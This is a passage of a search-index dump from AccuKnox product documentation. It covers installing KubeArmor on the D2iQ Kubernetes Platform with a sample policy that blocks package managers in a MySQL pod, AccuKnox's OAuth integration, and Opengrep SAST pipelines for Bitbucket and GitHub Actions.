<p></p>"},{"location":"integrations/nutanix-accuknox/#monitoring-logs","title":"Monitoring Logs","text":"<p>AccuKnox CNAPP Solution provides comprehensive visibility of the cloud assets with the help of Dashboards and logs/alerts. AccuKnox\u2019s open-source KubeArmor can forward policy-related logs/alerts to the SaaS. Also, it can forward the container logs that are present in the workloads. Logs are generated in real time based on certain conditions/rules you configure on the security policies. You will get logs from four different components.</p> <p></p> <p>The Log Detail contents vary depending on the selected component type of the log event.</p> <p></p>"},{"location":"integrations/nutanix-accuknox/#siemnotification-integration","title":"SIEM/Notification Integration","text":"<p>Users can use the Feeder service agent to pass the logs to other SIEM tools like Splunk, ELK, Rsyslog, etc.., Users can also forward the logs from AccuKnox SaaS using the channel integration option to these SIEM tools. Users can integrate with various SIEM and ticketing tools like Splunk, Rsyslog, AWS CloudWatch, Elastic Search, Slack, and Jira.</p> <p></p>"},{"location":"integrations/nutanix-accuknox/#use-case-videos","title":"Use Case Videos","text":"<p>SCHEDULE DEMO</p>"},{"location":"integrations/nutanix-kubearmor/","title":"Nutanix Installation with KubeArmor","text":""},{"location":"integrations/nutanix-kubearmor/#introducing-the-d2iq-kubernetes-platform-dkp","title":"Introducing the D2iQ Kubernetes Platform (DKP)","text":"<p>As the leading independent Kubernetes Management Platform in production, the D2iQ Kubernetes Platform (DKP) provides a holistic approach and a complete set of enterprise-grade technologies, services, training, and support to build and run applications in production at scale. Built around the open-source Cluster API, the new version of DKP becomes the single, centralized point of control for an organization\u2019s application infrastructure, empowering organizations to more easily deploy, manage, and scale Kubernetes workloads in Day 2 production environments</p> <p></p>"},{"location":"integrations/nutanix-kubearmor/#deploying-d2iq-kubernetes-platform-on-aws-cloud","title":"Deploying D2iQ Kubernetes Platform on AWS Cloud","text":""},{"location":"integrations/nutanix-kubearmor/#pre-requisites","title":"Pre-requisites","text":"<ol> <li>Latest DKP Binary</li> <li>DKP Enterprise License key</li> <li>Hands-on experience with AWS services like CloudFormation, EC2, IAM, etc.</li> <li>Follow the official documentation for DKP deployment</li> </ol> <p>Once, DKP deployment is done, Activate the enterprise license from the UI</p>"},{"location":"integrations/nutanix-kubearmor/#dkp-application-catalog","title":"DKP Application catalog","text":"<p>Catalog applications are any third-party or open-source applications that appear in the Catalog. These applications are deployed to be used for customer workloads.</p> <p>D2iQ provides DKP Catalog Applications for use in your environment.</p> <p></p> <p>We will be adding KubeArmor to the DKP application catalog.</p>"},{"location":"integrations/nutanix-kubearmor/#introducing-kubearmor-an-open-source-policy-enforcement-engine","title":"Introducing KubeArmor - An Open-Source policy enforcement engine","text":"<p>KubeArmor is a cloud-native runtime security enforcement system that restricts the behavior (such as process execution, file access, and networking operations) of pods, containers, and nodes (VMs) at the system level.</p> <p>KubeArmor leverages Linux security modules (LSMs) such as AppArmor, SELinux, or BPF-LSM to enforce the user-specified policies. KubeArmor generates rich alerts/telemetry events with container/pod/namespace identities by leveraging eBPF.</p> <p>KubeArmor Github</p> <p></p>"},{"location":"integrations/nutanix-kubearmor/#steps-to-add-kubearmor-to-dkp-catalog","title":"Steps to add KubeArmor to DKP Catalog","text":"<ol> <li>Create a git-repository</li> <li>Set the Git Repository Directory Structure</li> </ol> <p>Use the following basic directory structure for your git repository:</p> <pre><code>\u251c\u2500\u2500 helm-repositories\n\u2502   \u251c\u2500\u2500 &lt;helm repository 1&gt;\n\u2502   \u2502   \u251c\u2500\u2500 kustomization.yaml\n\u2502   \u2502   \u2514\u2500\u2500 &lt;helm repository name&gt;.yaml\n\u2502   \u2514\u2500\u2500 &lt;helm repository 2&gt;\n\u2502       \u251c\u2500\u2500 kustomization.yaml\n\u2502       \u2514\u2500\u2500 &lt;helm repository name&gt;.yaml\n\u2514\u2500\u2500 services\n    \u251c\u2500\u2500 &lt;app name&gt;\n    \u2502   \u251c\u2500\u2500 &lt;app version1&gt; # semantic version of the app helm chart. e.g., 1.2.3\n    \u2502   \u2502   \u251c\u2500\u2500 defaults\n    \u2502   \u2502   \u2502   \u251c\u2500\u2500 cm.yaml\n    \u2502   \u2502   \u2502   \u2514\u2500\u2500 kustomization.yaml\n    \u2502   \u2502   \u251c\u2500\u2500 &lt;app name&gt;.yaml\n    \u2502   \u2502   \u2514\u2500\u2500 kustomization.yaml\n    \u2502   \u251c\u2500\u2500 &lt;app version2&gt; # another semantic version of the app helm chart. e.g., 2.3.4\n    \u2502   \u2502   \u251c\u2500\u2500 defaults\n    \u2502   \u2502   \u2502   \u251c\u2500\u2500 cm.yaml\n    \u2502   \u2502   \u2502   \u2514\u2500\u2500 kustomization.yaml\n    \u2502   \u2502   \u251c\u2500\u2500 &lt;app name&gt;.yaml\n    \u2502   \u2502   \u2514\u2500\u2500 kustomization.yaml\n    \u2502   \u2514\u2500\u2500 metadata.yaml\n    \u2514\u2500\u2500 &lt;another app name&gt;\n    ...\n</code></pre> <p>Refer to the KubeArmor Git repository for the DKP Catalog Link</p> <p>Note: Please remember to fill out the metadata.yaml with the application details that will be visible on the UI.</p>"},{"location":"integrations/nutanix-kubearmor/#enable-kubearmor-from-the-workspace-catalog","title":"Enable KubeArmor from the Workspace Catalog","text":""},{"location":"integrations/nutanix-kubearmor/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>Determine the name of the workspace where you wish to perform the deployments. You can use the <code>dkp get workspaces</code> command to see the list of workspace names and their corresponding namespaces.</p> </li> <li> <p>Set the <code>WORKSPACE_NAMESPACE</code> environment variable to the name of the workspace\u2019s namespace where the cluster is attached:</p> </li> </ul> <pre><code>export WORKSPACE_NAMESPACE=&lt;workspace_namespace&gt;\n</code></pre>"},{"location":"integrations/nutanix-kubearmor/#steps-to-enable","title":"Steps to enable","text":"<p>Step 1: Get the list of available applications to enable using the following command:</p> <pre><code>kubectl get apps -n kommander\n</code></pre> <p>Sample:</p> <pre><code>kubectl get apps -n kommander --kubeconfig cluster.conf\nNAME                  APP ID          APP VERSION   AGE\nelasticsearch-2.0.0   elasticsearch   2.0.0         3d22h\ngitlab-5.7.0          gitlab          5.7.0         3d22h\nkeycloak-15.1.0       keycloak        15.1.0        3d22h\nkubearmor-1.3.2       kubearmor       1.3.2         3d22h\nlinkerd-2.13.4        linkerd         2.13.4        3d22h\nlinkerd-2.13.5        linkerd         2.13.5        3d22h\nweave-gitops-0.11.0   weave-gitops    0.11.0        3d22h\nweave-gitops-0.12.0   weave-gitops    0.12.0        3d22h\nweave-gitops-0.18.0   weave-gitops    0.18.0        3d22h\nweave-gitops-0.32.0   weave-gitops    0.32.0        3d22h\n</code></pre> <p>Step 2: Deploy KubeArmor from the list with an <code>AppDeployment</code> resource.</p> <p>Step 3: Within the <code>AppDeployment</code>, define the <code>appRef</code> to specify which <code>App</code> will be enabled:</p> <pre><code>cat &lt;&lt;EOF | kubectl apply -f -\napiVersion: apps.kommander.d2iq.io/v1alpha3\nkind: AppDeployment\nmetadata:\nname: my-custom-app\nnamespace: ${WORKSPACE_NAMESPACE}    //kommander\nspec:\nappRef:\n    name: kubearmor-1.3.2\n    kind: App\nEOF\n</code></pre>"},{"location":"integrations/nutanix-kubearmor/#verify-applications","title":"Verify Applications","text":"<p>After completing the previous steps, your applications are enabled. Connect to the attached cluster and check the <code>HelmReleases</code> to verify the deployments:</p> <pre><code>kubectl get helmreleases -n kommander\n</code></pre> <p>Output:</p> <pre><code>kubectl get helmreleases -n kommander --kubeconfig cluster.conf\nNAME                            AGE     READY   STATUS\nai-navigator-cluster-info-api   8d      True    Release reconciliation succeeded\ncentralized-grafana             8d      True    Release reconciliation succeeded\ncentralized-kubecost            8d      True    Release reconciliation succeeded\ncluster-observer-2360587938     8d      True    Release reconciliation succeeded\ndex                             8d      True    Release reconciliation succeeded\ndex-k8s-authenticator           8d      True    Release reconciliation succeeded\ndkp-insights-management         8d      True    Release reconciliation succeeded\ngatekeeper                      8d      True    Release reconciliation succeeded\ngatekeeper-proxy-mutations      8d      True    Release reconciliation succeeded\ngitea                           8d      True    Release reconciliation succeeded\ngrafana-logging                 8d      True    Release reconciliation succeeded\ngrafana-loki                    8d      True    Release reconciliation succeeded\nkarma                           8d      True    Release reconciliation succeeded\nkarma-traefik                   8d      True    Release reconciliation succeeded\nkarma-traefik-certs             8d      True    Release reconciliation succeeded\nkommander                       8d      True    Release reconciliation succeeded\nkommander-appmanagement         8d      True    Release reconciliation succeeded\nkommander-operator              8d      True    Release reconciliation succeeded\nkommander-ui                    8d      True    Release reconciliation succeeded\nkube-oidc-proxy                 8d      True    Release reconciliation succeeded\nkube-prometheus-stack           8d      True    Release reconciliation succeeded\nkubearmor-operator              3d23h   True    Release reconciliation succeeded\nkubecost                        8d      True    Release reconciliation succeeded\nkubecost-thanos-traefik         8d      True    Release reconciliation succeeded\nkubecost-traefik-certs          8d      True    Release reconciliation succeeded\nkubefed                         8d      True    Release reconciliation succeeded\nkubernetes-dashboard            8d      True    Release reconciliation succeeded\nkubetunnel                      8d      True    Release reconciliation succeeded\nlogging-operator                8d      True    Release reconciliation succeeded\nlogging-operator-logging        8d      True    Release reconciliation succeeded\nobject-bucket-claims            8d      True    Release reconciliation succeeded\nprometheus-adapter              8d      True    Release reconciliation succeeded\nprometheus-thanos-traefik       8d      True    Release reconciliation succeeded\nprometheus-traefik-certs        8d      True    Release reconciliation succeeded\nreloader                        8d      True    Release reconciliation succeeded\nrook-ceph                       8d      True    Release reconciliation succeeded\nrook-ceph-cluster               8d      True    Release reconciliation succeeded\nthanos                          8d      True    Release reconciliation succeeded\ntraefik                         8d      True    Release reconciliation succeeded\ntraefik-forward-auth-mgmt       8d      True    Release reconciliation succeeded\nvelero                          8d      True    Release reconciliation succeeded\n</code></pre>"},{"location":"integrations/nutanix-kubearmor/#verify-from-the-ui","title":"Verify from the UI","text":"<p>Check the status of Kubearmor pods using</p> <pre><code>kubectl get po -A -n kommander\n</code></pre> <p>Sample:</p> <pre><code>kubectl get po -A -n kommander --kubeconfig cluster.conf\n</code></pre> <p></p> <p>All the pods are running now we can enforce KubeArmor to a sample application</p>"},{"location":"integrations/nutanix-kubearmor/#applying-kubearmor-policy","title":"Applying KubeArmor Policy","text":"<p>Step 1: User needs to access the Cluster to apply the following KubeArmor policy.</p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: harden-mysql-pkg-mngr-exec\nnamespace: wordpress-mysql\nspec:\naction: Block\nmessage: Alert! Execution of package management process inside container is denied\nprocess:\n    matchPaths:\n    - path: /usr/bin/apt\n    - path: /usr/bin/apt-get\n    - path: /bin/apt-get\n    - path: /sbin/apk\n    - path: /bin/apt\n    - path: /usr/bin/dpkg\n    - path: /bin/dpkg\n    - path: /usr/bin/gdebi\n    - path: /bin/gdebi\n    - path: /usr/bin/make\n    - path: /bin/make\n    - path: /usr/bin/yum\n    - path: /bin/yum\n    - path: /usr/bin/rpm\n    - path: /bin/rpm\n    - path: /usr/bin/dnf\n    - path: /bin/dnf\n    - path: /usr/bin/pacman\n    - path: /usr/sbin/pacman\n    - path: /bin/pacman\n    - path: /sbin/pacman\n    - path: /usr/bin/makepkg\n    - path: /usr/sbin/makepkg\n    - path: /bin/makepkg\n    - path: /sbin/makepkg\n    - path: /usr/bin/yaourt\n    - path: /usr/sbin/yaourt\n    - path: /bin/yaourt\n    - path: /sbin/yaourt\n    - path: /usr/bin/zypper\n    - path: /bin/zypper\nselector:\n    matchLabels:\n    app: mysql\nseverity: 5\ntags:\n- NIST\n- NIST_800-53_CM-7(4)\n- SI-4\n- process\n- NIST_800-53_SI-4\n</code></pre> <p>Save the policy as a  \u201c.yaml\u201d file.</p> <p>Step 2: Apply the policy from the cluster:</p> <pre><code>kubectl apply -f mysql.yaml -n wordpress-mysql --kubeconfig cluster.conf\nkubearmorpolicy.security.kubearmor.com/harden-mysql-pkg-mngr-exec created\n</code></pre> <p>Step 3: Violating the Policy</p> <p>To violate the Above policy users need to exec into the MySQL pod under the WordPress-MySQL namespace</p> <pre><code>kubectl exec -it mysql-74775b4bf4-mfdcr -n wordpress-mysql --kubeconfig cluster.conf -- bash\n</code></pre> <p>Try to make use of the package manager</p> <pre><code>root@mysql-74775b4bf4-mfdcr:/# apt-get update\nbash: /usr/bin/apt-get: Permission denied\nroot@mysql-74775b4bf4-mfdcr:/# apt upgrade\nbash: /usr/bin/apt: Permission denied\n</code></pre> <p>Step 4: Policy logs</p> <p>To see the Policy Logs the users must navigate to the Cluster CLI and execute the following command to watch the logs. Violate the policy after executing from MySQL pod</p> <pre><code>karmor logs\n</code></pre> <p>Sample Output:</p> <pre><code>karmor logs --kubeconfig cluster.conf\nlocal port to be used for port forwarding kubearmor-relay-599df6f667-pzjqk: 32890\nCreated a gRPC client (localhost:32890)\nChecked the liveness of the gRPC server\nStarted to watch alerts\n== Alert / 2024-04-01 11:12:56.921907 ==\nClusterName: default\nHostName: ip-10-0-122-67\nNamespaceName: wordpress-mysql\nPodName: mysql-74775b4bf4-mfdcr\nLabels: app=mysql\nContainerName: mysql\nContainerID: befbef6b9371eac5d3966f40f87593829e6f1a820f2454bbd13e656f0b5bbdab\nContainerImage: docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae\nType: MatchedPolicy\nPolicyName: harden-mysql-pkg-mngr-exec\nSeverity: 5\nMessage: Alert! Execution of package management process inside container is denied\nSource: /bin/bash\nResource: /usr/bin/apt-get update\nOperation: Process\nAction: Block\nData: syscall=SYS_EXECVE\nEnforcer: AppArmor\nResult: Permission denied\nATags: [NIST NIST_800-53_CM-7(4) SI-4 process NIST_800-53_SI-4]\nCwd: /\nHostPID: 770816\nHostPPID: 270053\nOwner: map[Name:mysql Namespace:wordpress-mysql Ref:Deployment]\nPID: 196\nPPID: 188\nParentProcessName: /bin/bash\nProcessName: /usr/bin/apt-get\nTTY: pts0\nTags: NIST,NIST_800-53_CM-7(4),SI-4,process,NIST_800-53_SI-4\nUID: 0\n</code></pre>"},{"location":"integrations/nutanix-kubearmor/#testing-the-integration-on-user-attached-eks-cluster","title":"Testing the Integration on User attached EKS cluster","text":"<p>This procedure requires the following items and configurations:</p> <ul> <li> <p>A fully configured and running Amazon https://aws.amazon.com/eks/\" target=\"_blank\"a&gt;EKS cluster with administrative privileges.</p> </li> <li> <p>The current version of DKP Enterprise is installed on your cluster.</p> </li> <li> <p>Ensure you have installed kubectl in your Management cluster.</p> </li> <li> <p>Follow the official guide to attach a EKS cluster.</p> </li> </ul>"},{"location":"integrations/nutanix-kubearmor/#installing-kubearmor","title":"Installing KubeArmor","text":"<p>Follow the same steps that we followed while deploying KubeArmor in the management cluster</p> <ol> <li>Create Git repository</li> <li>Deploy KubeArmor from the apps list with an <code>AppDeployment</code> resource.</li> <li>Verify the deployment from the UI</li> </ol> <p></p> <p>KubeArmor is enabled under Default Workspace in the attached EKS cluster and all the pods are running</p> <p></p>"},{"location":"integrations/nutanix-kubearmor/#applying-kubearmor-policy_1","title":"Applying KubeArmor Policy","text":"<p>Step 1: The user needs to go to the cluster to apply the following KubeArmor Policy</p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: harden-mysql-pkg-mngr-exec\nnamespace: wordpress-mysql\nspec:\naction: Block\nmessage: Alert! Execution of package management process inside container is denied\nprocess:\n    matchPaths:\n    - path: /usr/bin/apt\n    - path: /usr/bin/apt-get\n    - path: /bin/apt-get\n    - path: /sbin/apk\n    - path: /bin/apt\n    - path: /usr/bin/dpkg\n    - path: /bin/dpkg\nselector:\n    matchLabels:\n    app: mysql\nseverity: 5\ntags:\n- NIST\n- NIST_800-53_CM-7(4)\n- SI-4\n- process\n- NIST_800-53_SI-4\n</code></pre> <p>Save the policy as a  \u201c.yaml\u201d file.</p> <p>Step 2: Apply the policy from the cluster:</p> <pre><code>kubectl apply -f mysql.yaml --kubeconfig dkp-eks-kubeconfig.conf\nkubearmorpolicy.security.kubearmor.com/harden-mysql-pkg-mngr-exec created\n</code></pre> <p>Step 3: Violating the Policy</p> <p>To violate the Above policy users need to exec into the MySQL pod under the WordPress-MySQL namespace</p> <pre><code>kubectl exec -it mysql-768cb6b7bd-txbvh -n wordpress-mysql --kubeconfig dkp-eks-kubeconfig.conf -- bash\n</code></pre> <p>Try to execute the blocked binary</p> <pre><code>root@mysql-768cb6b7bd-txbvh:/# apt-get\nbash: /usr/bin/apt-get: Permission denied\n</code></pre> <p>Step 4: Policy logs</p> <p>To see the Policy Logs the users must navigate to the Cluster CLI and give the following command and then violate the policy from MySQL pod</p> <pre><code>karmor logs --kubeconfig dkp-eks-kubeconfig.conf\n</code></pre> <p>Sample Output:</p> <pre><code>karmor logs --kubeconfig dkp-eks-kubeconfig.conf\nlocal port to be used for port forwarding kubearmor-relay-6b59fbf77f-f8g2m: 32859\nCreated a gRPC client (localhost:32859)\nChecked the liveness of the gRPC server\nStarted to watch alerts\n== Alert / 2024-04-05 17:11:16.812423 ==\nClusterName: default\nHostName: ip-10-0-120-36.ec2.internal\nNamespaceName: wordpress-mysql\nPodName: mysql-768cb6b7bd-txbvh\nLabels: app=mysql\nContainerName: mysql\nContainerID: 42b044cdd51b2e01f106a14fc6e06cf2d5d786fe1b24e3212e2425821f50111f\nContainerImage: docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae\nType: MatchedPolicy\nPolicyName: harden-mysql-pkg-mngr-exec\nSeverity: 5\nMessage: Alert! Execution of package management process inside container is denied\nSource: /bin/bash\nResource: /usr/bin/apt-get\nOperation: Process\nAction: Block\nData: lsm=SECURITY_BPRM_CHECK\nEnforcer: BPFLSM\nResult: Permission denied\nATags: [NIST NIST_800-53_CM-7(4) SI-4 process NIST_800-53_SI-4]\nCwd: /\nHostPID: 21015\nHostPPID: 20531\nOwner: map[Name:mysql Namespace:wordpress-mysql Ref:Deployment]\nPID: 167\nPPID: 160\nParentProcessName: /bin/bash\nProcessName: /usr/bin/apt-get\nTags: NIST,NIST_800-53_CM-7(4),SI-4,process,NIST_800-53_SI-4\nUID: 0\n</code></pre> <p>Note: Once the KubeArmor is added to the DKP default application catalog a user can directly enable it from the UI</p>"},{"location":"integrations/oauth/","title":"OAuth Integration with AccuKnox","text":"<p>The OAuth integration with AccuKnox encompasses authorization (token generation, validation, and expiry) as well as third-party app integration. Our implementation adheres to industry standards and best practices for OAuth. It also ensures seamless integration of AccuKnox APIs.</p> <p>AccuKnox provides Oauth flow that will enable the client to access the AccuKnox APIs securely. AccuKnox APIs request an internal query and provide JWT tokens for the third-party apps without any hassle of MFA.</p>"},{"location":"integrations/oauth/#1-accuknox-oauth-features-and-use-cases","title":"1. AccuKnox OAuth Features and Use-cases","text":""},{"location":"integrations/oauth/#11-role-based-authentication-through-oauth","title":"1.1 Role based authentication through OAuth","text":"<p>Verify users by their credentials and provide access according to their designated roles and permissions. This ensures that Third-Party Applications or Users gain access to specific functionalities based on the roles assigned within AccuKnox Saas. For instance, if a user's profile is configured with roles that limit them to viewing asset inventory, any authorization utilizing this user will also be restricted to the same access level..</p>"},{"location":"integrations/oauth/#12-accuknox-unified-view","title":"1.2 AccuKnox Unified view","text":"<p>AccuKnox Insights, encompassing asset and registry vulnerability data, seamlessly become part of the unified view through integrated widgets. This integration enhances the overall experience by offering valuable information and analytics right at your fingertips.</p> <p>Within this unified view, you can access the following insightful widgets:</p> <ol> <li> <p>Top Vulnerable Cluster: Gain instant visibility into the most critical vulnerabilities affecting your clusters. This widget displays the top 10 vulnerable applications, allowing you to prioritize your security efforts effectively and address high-risk areas promptly.</p> </li> <li> <p>Top Tickets: Monitor the aging of vulnerabilities efficiently with the \"Vulnerability Ageing\" widget. This tool helps you stay on top of your security remediation efforts by tracking how long vulnerabilities have been present, ensuring timely action is taken to mitigate risks.</p> </li> <li> <p>Registry Insights: Dive deeper into registry-related data with the dedicated \"Registry Insights\" widget. This feature empowers you to analyze and manage container images and their associated vulnerabilities, enhancing your ability to maintain a secure and compliant container environment.</p> </li> </ol>"},{"location":"integrations/oauth/#13-authorizing-third-party-apps","title":"1.3 Authorizing third party Apps","text":"<p>Leverage the OAuth 2.0 authorization flow to facilitate third-party applications in accessing AccuKnox APIs seamlessly. This robust authentication mechanism ensures the security and integrity of the API access.</p> <p>More detailed explanation here:</p> <p>1.3.1 Utilize the OAuth 2.0 Authorization Flow for Third-Party Application Integration with AccuKnox APIs</p> <p>AccuKnox adopts the OAuth 2.0 authorization flow to empower third-party applications with the ability to interact with our APIs effectively and securely. This authorization framework provides a structured and standardized approach to access control, safeguarding both the integrity of your data and the privacy of your users.</p> <p>1.3.2 Grant Access through Access and Refresh Tokens</p> <p>To ensure a robust layer of security, AccuKnox utilizes access and refresh tokens in the OAuth 2.0 flow. These tokens serve as the keys to access the protected resources within our system. Here's how they work:</p> <ul> <li> <p>Access Tokens: These tokens are short-lived and provide immediate authorization for a specific set of operations or resources. They grant third-party apps temporary access to the AccuKnox APIs, allowing them to perform authorized actions on behalf of the user or organization.</p> </li> <li> <p>Refresh Tokens: While access tokens have a limited lifespan, refresh tokens are long-lived and serve as a means to obtain new access tokens when the old ones expire. This process maintains a continuous and secure connection between third-party apps and AccuKnox APIs without requiring users to repeatedly log in or grant permissions.</p> </li> </ul>"},{"location":"integrations/oauth/#2-oauth-integration-process-for-third-party-applications","title":"2. OAuth Integration Process for Third-Party Applications","text":"<p>1. User Onboarding and Account Creation:</p> <ul> <li>Users begin by setting up AccuKnox accounts and connecting their clusters and cloud accounts.</li> </ul> <p>2. Third-Party App Authorization Request:</p> <ul> <li>Third-party applications initiate the OAuth process by seeking permission from AccuKnox.</li> </ul> <p>3. User Authorization:</p> <ul> <li>Users grant permission to third-party apps, which redirects them to AccuKnox for authentication and authorization.</li> </ul> <p></p> <ul> <li>Enter the MFA code</li> </ul> <p></p> <ul> <li>Select the Tenant you want to authorize to the Third Party Application</li> </ul> <p></p> <p>4.Token Issuance:</p> <ul> <li> <p>Upon successful authorization, third-party apps receive an OAuth code as a query params (code) to the redirect uri, which the client needs to verify using the https://cspm.dev.accuknox.com/api/v1/o/token/ endpoint.</p> </li> <li> <p>Upon successful verification an access and refresh token will be issued</p> </li> </ul> <p>5.Token Usage:</p> <ul> <li>Access tokens enable third-party apps to interact with AccuKnox APIs, while refresh tokens can be used to obtain new access tokens when the old ones expire.</li> </ul> <p>6.Access Token Verification:</p> <ul> <li>AccuKnox APIs validate incoming access tokens to ensure authorization before serving the requested data.</li> </ul>"},{"location":"integrations/oauth/#3-third-party-applications-for-developers","title":"3. Third-Party Applications (For Developers)","text":"<p>To begin the development of a third-party application utilizing AccuKnox OAuth, users are required to initiate the process by registering an AccuKnox OAuth Application. During this registration, they will need to specify the redirection URIs.</p> <p>After the AccuKnox team completes the configuration of the OAuth application on the backend, we will provide you with the following details: Client ID and Client Secret. These credentials can be employed by the user to perform a POST request to the Token endpoint, enabling them to obtain both an Access Token and a Refresh Token.</p> <p>With these tokens in hand, users can securely make API calls to AccuKnox, thereby accessing data on the platform for which they have been authenticated.</p> <p>Here are the AccuKnox endpoints available:</p> <p>3.1 User Authentication Endpoints:</p> <ul> <li>Sign-up: https://app.dev.accuknox.com/sign-up</li> <li>Login: https://app.dev.accuknox.com/login</li> </ul> <p>3.2 OAuth Implementation Endpoints:</p> <ul> <li>Authorization endpoint: https://cspm.dev.accuknox.com/api/v1/o/authorize/</li> <li>Token endpoint: https://cspm.dev.accuknox.com/api/v1/o/token/ (Note: Token revocation is not currently supported through an endpoint.)</li> </ul> <p>3.3 Widgets Data Access Endpoints:</p> <ul> <li>For CSPM: https://cspm.dev.accuknox.com/api/swagger/</li> </ul> <p>SCHEDULE DEMO</p>"},{"location":"integrations/opengrep-sast-bitbucket/","title":"Integrating SAST with AccuKnox in Bitbucket Pipelines","text":"<p>This guide shows how to integrate SAST scanning into a Bitbucket Pipeline and automatically forward results to AccuKnox for analysis and mitigation.</p>"},{"location":"integrations/opengrep-sast-bitbucket/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>Bitbucket Access: Access to your Bitbucket repository where the pipeline will be implemented.</p> </li> <li> <p>An active AccuKnox account.</p> </li> </ul>"},{"location":"integrations/opengrep-sast-bitbucket/#integration-steps","title":"Integration Steps","text":""},{"location":"integrations/opengrep-sast-bitbucket/#step-1-generate-accuknox-api-token","title":"Step 1: Generate AccuKnox API Token","text":"<ul> <li> <p>Log in to the AccuKnox platform.</p> </li> <li> <p>Go to Settings &gt; Tokens and create a new token.</p> </li> <li> <p>Copy the Token and Tenant ID and save it for later use. For guidance on creating tokens, refer to Creating Tokens in AccuKnox.</p> </li> </ul>"},{"location":"integrations/opengrep-sast-bitbucket/#step-2-configure-bitbucket-pipeline-variables","title":"Step 2: Configure Bitbucket Pipeline Variables","text":"<ul> <li> <p>Navigate to your Bitbucket repository.</p> </li> <li> <p>Go to Repository Settings &gt; Repository Variables and click Add Variable. Refer to How to Create CI/CD Variables in Bitbucket.</p> </li> </ul>"},{"location":"integrations/opengrep-sast-bitbucket/#inputs-for-accuknox-sast-task","title":"Inputs for AccuKnox SAST Task","text":"Input Value Description Default Value <code>SOFT_FAIL</code> Do not return an error code if secrets are found. <code>true</code> <code>ACCUKNOX_TOKEN</code> The token for authenticating with the CSPM panel. N/A (Required) <code>ACCUKNOX_TENANT</code> The ID of the tenant associated with the CSPM panel. N/A (Required) <code>ACCUKNOX_ENDPOINT</code> The URL of the CSPM panel to push the scan results to. N/A (Required) <code>ACCUKNOX_LABEL</code> The label created in AccuKnox SaaS for associating scan results. N/A (Required)"},{"location":"integrations/opengrep-sast-bitbucket/#step-3-define-bitbucket-pipeline","title":"Step 3: Define Bitbucket Pipeline","text":"<p>In your repository, create or update your pipeline YAML (<code>bitbucket-pipelines.yml</code>) and add the following steps:</p> <pre><code>pipelines:\n  branches:\n    main:\n    - step:\n        name: Accuknox SAST\n        script:\n          - pipe: accu-knox/scan:2.0.0\n            variables:\n              SCAN_TYPE: SAST\n              SOFT_FAIL: \"true\"\n              ACCUKNOX_TOKEN: ${ACCUKNOX_TOKEN}\n              ACCUKNOX_TENANT: ${ACCUKNOX_TENANT}\n              ACCUKNOX_ENDPOINT: ${ACCUKNOX_ENDPOINT}\n              ACCUKNOX_LABEL: ${ACCUKNOX_LABEL}\n</code></pre>"},{"location":"integrations/opengrep-sast-bitbucket/#workflow-execution-without-accuknox","title":"Workflow Execution Without AccuKnox","text":"<p>Initially, Opengrep scans the code for vulnerabilities but does not forward results to AccuKnox, requiring manual review.</p>"},{"location":"integrations/opengrep-sast-bitbucket/#workflow-execution-with-accuknox","title":"Workflow Execution With AccuKnox","text":"<p>With AccuKnox integrated, Opengrep scan results are automatically sent to AccuKnox for further risk assessment and remediation. </p>"},{"location":"integrations/opengrep-sast-bitbucket/#viewing-results-in-accuknox","title":"Viewing Results in AccuKnox","text":"<p>After the pipeline run:</p> <ul> <li> <p>Log in to AccuKnox.</p> </li> <li> <p>Go to Issues &gt; Findings and select Opengrep Findings.   </p> </li> <li> <p>Inspect vulnerabilities, apply fixes, and create tracking tickets if necessary.   </p> </li> </ul>"},{"location":"integrations/opengrep-sast-bitbucket/#conclusion","title":"Conclusion","text":"<p>Integrating SAST with Bitbucket Pipelines enables automated vulnerability detection and centralized security management. It ensures early detection of issues, risk assessment, and provides actionable insights to maintain code security and quality.</p>"},{"location":"integrations/opengrep-sast/","title":"Integrating SAST with AccuKnox in GitHub Actions","text":"<p>This guide outlines integrating SAST scanning into a GitHub Actions workflow and forwarding the results to AccuKnox for analysis and mitigation.</p>"},{"location":"integrations/opengrep-sast/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>GitHub repository with Actions enabled</p> </li> <li> <p>AccuKnox SaaS account</p> </li> </ul>"},{"location":"integrations/opengrep-sast/#integration-steps","title":"Integration Steps","text":""},{"location":"integrations/opengrep-sast/#step-1-generate-accuknox-api-token","title":"Step 1: Generate AccuKnox API Token","text":"<p>Log in to AccuKnox. Navigate to Settings and select Tokens to create an AccuKnox token to forward scan results to SaaS. For details on generating tokens, refer to How to Create Tokens.</p>"},{"location":"integrations/opengrep-sast/#step-2-configure-github-secrets","title":"Step 2: Configure GitHub Secrets","text":"<p>Define the following secrets in GitHub, for details on configuring the secrets/variables, refer to Using secrets in GitHub Actions.</p> <ul> <li> <p>ACCUKNOX_TOKEN: AccuKnox API token for authorization.</p> </li> <li> <p>ACCUKNOX_TENANT: Your AccuKnox tenant ID.F</p> </li> <li> <p>ACCUKNOX_ENDPOINT: The AccuKnox API URL (e.g., cspm.demo.accuknox.com).</p> </li> <li> <p>ACCUKNOX_LABEL: The label for your scan.</p> </li> </ul>"},{"location":"integrations/opengrep-sast/#step-3-define-github-actions-workflow","title":"Step 3: Define GitHub Actions Workflow","text":"<p>Create a new GitHub Actions workflow file <code>.github/workflows/accuknox-opengrep.yml</code> with the following configuration:</p> <pre><code>name: AccuKnox Opengrep SAST\n\non:\n  push:\n    branches:\n      - opengrep\n  pull_request:\n    branches:\n      - opengrep\n\njobs:\n  accuknox-cicd:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v3\n\n      - name: \"Run AccuKnox SAST: Opengrep\"\n        uses: accuknox/sast-scan-opengrep-action@1.0.0\n        with:\n          accuknox_endpoint: \"${{ secrets.ACCUKNOX_ENDPOINT }}\"\n          accuknox_tenant: \"${{ secrets.ACCUKNOX_TENANT }}\"\n          accuknox_token: \"${{ secrets.ACCUKNOX_TOKEN }}\"\n          accuknox_label: \"${{ secrets.ACCUKNOX_LABEL }}\"\n          input_soft_fail: true\n          upload_artifact: true\n</code></pre>"},{"location":"integrations/opengrep-sast/#inputs-for-accuknox-sast-action","title":"Inputs for AccuKnox SAST Action","text":"Name Description Required 